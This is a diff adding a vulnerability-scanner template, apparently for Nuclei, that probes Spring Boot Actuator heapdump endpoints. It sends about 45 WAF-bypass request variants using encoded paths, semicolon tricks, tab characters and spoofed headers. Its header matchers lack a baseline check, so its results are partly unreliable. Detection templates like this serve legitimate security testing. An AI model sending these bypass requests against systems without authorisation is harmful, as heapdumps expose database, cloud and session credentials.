@@ -1,0 +1,275 @@
+id: springboot-heapdump-bypass
+
+info:
+  name: Spring Boot Heapdump - WAF Bypass & Credential Exposure
+  author: Shafranpackeer
+  severity: critical
+  description: |
+    Detects exposed Spring Boot Actuator heapdump endpoints using multiple bypass techniques.
+    Heapdump contains full JVM memory snapshot which often includes:
+    - Database credentials (JDBC connection strings)
+    - API keys and tokens (AWS, Azure, GCP credentials)
+    - Session tokens and JWTs
+    - Basic Auth headers
+    - Environment variables
+    - Internal service URLs
+
+    Real-world impact: Volkswagen breach - attackers extracted AWS credentials from heapdump,
+    gaining access to 9TB of vehicle GPS tracking data.
+  reference:
+    - https://www.wiz.io/blog/spring-boot-actuator-misconfigurations
+    - https://www.trendmicro.com/en/research/26/c/from-misconfigured-spring-boot-actuator-to-sharepoint-exfiltrati.html
+    - https://nawardrox.medium.com/analyzing-java-heap-dump-vulnerabilities-in-spring-boot-applications-5e18d16314c2
+    - https://a6z.co/exploiting-exposed-spring-boot-heapdump-endpoint
+  metadata:
+    max-request: 45
+    verified: true
+  tags: springboot,heapdump,exposure,critical,credentials,bypass,waf-bypass
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N
+    cvss-score: 10.0
+    cwe-id: CWE-200,CWE-532
+
+variables:
+  random_path: "{{rand_base(8)}}"
+
+http:
+  - raw:
+      # Baseline request to detect false positives
+      - |
+        GET /{{random_path}} HTTP/1.1
+        Host: {{Hostname}}
+
+      # ============================================
+      # STANDARD HEAPDUMP PATHS
+      # ============================================
+      - |
+        GET /actuator/heapdump HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /heapdump HTTP/1.1
+        Host: {{Hostname}}
+
+      # ============================================
+      # WAF BYPASS - URL ENCODING
+      # $55,000+ bug bounty technique
+      # ============================================
+      - |
+        GET /actuator/heapdump%23 HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /%61ctuator/heapdump HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /a%63tuator/heapdump HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /ac%74uator/heapdump HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /act%75ator/heapdump HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /actu%61tor/heapdump HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /actua%74or/heapdump HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /actuat%6Fr/heapdump HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /actuato%72/heapdump HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /%61%63%74%75%61%74%6F%72/heapdump HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /actuator/%68eapdump HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /actuator/h%65apdump HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /actuator/he%61pdump HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /actuator/hea%70dump HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /actuator/heap%64ump HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /actuator/heapd%75mp HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /actuator/heapdu%6Dp HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /actuator/heapdum%70 HTTP/1.1
+        Host: {{Hostname}}
+
+      # ============================================
+      # SEMICOLON BYPASS (Spring parser quirk)
+      # ============================================
+      - |
+        GET /actuator;/heapdump HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /;/actuator/heapdump HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /actuator;.json/heapdump HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /actuator;whatever/heapdump HTTP/1.1
+        Host: {{Hostname}}
+
+      # ============================================
+      # ALTERNATE BASE PATHS
+      # ============================================
+      - |
+        GET /manage/heapdump HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /management/heapdump HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /admin/heapdump HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /monitor/heapdump HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /mgmt/heapdump HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /api/actuator/heapdump HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /internal/actuator/heapdump HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /system/actuator/heapdump HTTP/1.1
+        Host: {{Hostname}}
+
+      # ============================================
+      # PATH TRAVERSAL & DOUBLE SLASH
+      # ============================================
+      - |
+        GET //actuator/heapdump HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /./actuator/heapdump HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /actuator//heapdump HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /actuator/./heapdump HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /actuator/heapdump/ HTTP/1.1
+        Host: {{Hostname}}
+
+      # ============================================
+      # TAB CHARACTER BYPASS (0x09)
+      # ============================================
+      - |
+        GET /actuator%09/heapdump HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /%09actuator/heapdump HTTP/1.1
+        Host: {{Hostname}}
+
+      # ============================================
+      # HEADER SPOOFING BYPASS
+      # ============================================
+      - |
+        GET /actuator/heapdump HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: 127.0.0.1
+
+      - |
+        GET /actuator/heapdump HTTP/1.1
+        Host: {{Hostname}}
+        X-Real-IP: 127.0.0.1
+        X-Originating-IP: 127.0.0.1
+
+      - |
+        GET /actuator/heapdump HTTP/1.1
+        Host: localhost
+        X-Forwarded-Host: {{Hostname}}
+
+    max-size: 2097152  # 2MB - enough to verify heapdump, not download full file
+
+    matchers-condition: or
+    matchers:
+      # GZIP compressed heapdump magic bytes (most common)
+      - type: dsl
+        name: gzip-heapdump
+        dsl:
+          - "!contains(hex_encode(body_1), '1f8b0800')"  # Baseline should NOT match
+          - "contains(hex_encode(body_2), '1f8b0800') || contains(hex_encode(body_3), '1f8b0800') || contains(hex_encode(body_4), '1f8b0800')"
+        condition: and
+
+      # HPROF format magic bytes
+      - type: dsl
+        name: hprof-format
+        dsl:
+          - "contains(hex_encode(body_2), '4a4156412050524f46494c45') || contains(hex_encode(body_3), '4a4156412050524f46494c45')"
+
+      # Alternative HPROF signature
+      - type: dsl
+        name: hprof-alt
+        dsl:
+          - "contains(hex_encode(body_2), '4850524f46') || contains(hex_encode(body_3), '4850524f46')"
+
+      # Content-Type detection
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
+          - "application/x-gzip"
+          - "application/gzip"
+        condition: or
+
+      # Content-Disposition with heapdump filename
+      - type: regex
+        part: header
+        regex:
+          - 'filename.*heapdump'
+          - 'filename.*\.hprof'
